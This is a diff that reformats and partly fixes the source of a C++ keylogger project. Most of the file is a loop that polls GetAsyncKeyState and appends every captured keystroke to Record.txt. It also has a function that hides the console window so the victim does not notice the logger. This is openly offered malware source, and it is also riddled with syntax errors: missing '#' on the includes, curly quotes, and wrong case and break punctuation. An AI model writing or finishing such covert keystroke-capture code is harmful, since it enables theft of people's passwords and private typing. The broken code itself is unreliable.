@@ -1,6 +1,7 @@
-# C++ Keylogger Project 
+// C++ Keylogger Project 
 
-# ( for (;;) creates an infinite loop)
+// ( for (;;) creates an infinite loop)
+
 include <iostream>
 include <windows.h>
 include <Winuser.h>
@@ -8,86 +9,91 @@ include <fstream>
 
 void log()
 int main()
-
-for(;;)
-   {
-     Sleep(0); 
-     #will pause the program for certain amount of milliseconds. 
-     for( key=8; key <=222; key++)
+{
+    char key;
+    for(;;)
+    {
+        for( key=8; key <=222; key++)
         {
-           if (GetAsyncKeyState(key) == -32767)
-              { 
+            if (GetAsyncKeyState(key) == -32767)
+            {
                 ofstream write ( “Record.txt”, ios :: app);
-                   if ( ( key>64) && (key<91) && !(GetAsyncKeyState(0x10)) )
-                      { 
-                           key+= 32;
-                           write << key;
-                           write.close ();
-                           break;
-                        }
-                   else if ((key >64) && (key<91))
-                      {
-                        write << key;
-                        write.close();
-                        break;
-                       }
-                   else
+                if ( ( key>64) && (key<91) && !(GetAsyncKeyState(0x10)) )
+                {
+                    key+= 32;
+                    write << key;
+                    write.close ();
+                    break;
+                }
+                else if ((key >64) && (key<91))
+                {
+                    write << key;
+                    write.close();
+                    break;
+                }
+                else
+                {
+                    switch(key)
                     {
-                        { 
-                           switch(key)
-                            
-
-                          {
-                               case 48: 
-                               #ascii for 0
-                                { 
-                                    if (GetAsyncKeyState(0x10) )
-                                         write << “)”;
-                                    else
-                                         write << “0”;
+                        case 48: 
+                        //ascii for 0
+                        {
+                            if (GetAsyncKeyState(0x10) )
+                                write << “)”;
+                            else
+                                write << “0”;
+                        }
+                        break;
+                        case 49 ;
+                        {
+                            if (GetAsyncKeyState(0x10) )
+                                write << “!”;
+                            else
+                                write << “1”; 
+                        }
+                        break;
+                        case 50 ;
+                        {
+                            if (GetAsyncKeyState(0x10) )
+                                write << “\”;
+                            else
+                                write << “2”; 
+                        }
+                        break;
+                        case VK_SPACE:   // virtual keys
+                            write << "<Space>";
+                        break;
+                        case VK_RETURN:
+                            write << "\n";
+                        break;
+                        case VK_TAB:
+                            write<< "<Tab>"   // press tab button
+                        break;
+                        case VK_BACKSPACE:
+                            write << "<Backspace>"; // backspace button
+                        break;
+                        case VK_ESCAPE:
+                            write << "<Esc>"
+                        break:
+                        case VK_DELETE:
+                            write<< "<Delete>";
+                        break;
+                    }
+                }
+                        
+                        
+            }
+        }
+        
+      
+    }
 }
-                            break ;
-                            case 49 ;
-                            {
-                                if (GetAsyncKeyState(0x10) )
-                                    write << “!”;
-                                else
-                                    write << “1”; 
-                             }
-                            case 50 ;
-                            {
-                                if (GetAsyncKeyState(0x10) )
-                                    write << “\”;
-                                else
-                                    write << “2”; 
-                             }
-                              break;
-                    case VK_SPACE:      //virtual keys
-   write << “ ”;
-break;
-case VK_RETURN:
-    write << “ \n”;
-break;
-case VK_TAB
-   write<< “TAB // press tab button”;
-break;
-case VK_BACKSPACE:
-   write << “<Backspace> ”;
-break;
-case VK_ESCAPE:
-  write < “<Esc>”;
-break;
-case VK_DELETE:
-   write<< “<Delete>”;
-break;
-
 //function to hide keylogger console window 
-void hide ()
+void hide_logger ()
 {
     HWND stealth; //creating a handler called stealth
-    AllorConsole();
-    Stealth=FindWindowA(“ConsoleWindowClass”, NULL);
+    AllocConsole();
+    stealth=FindWindowA(“ConsoleWindowClass”, NULL);
     ShowWindow(stealth,0); //0 means false so do not show the logger
 }
-
 
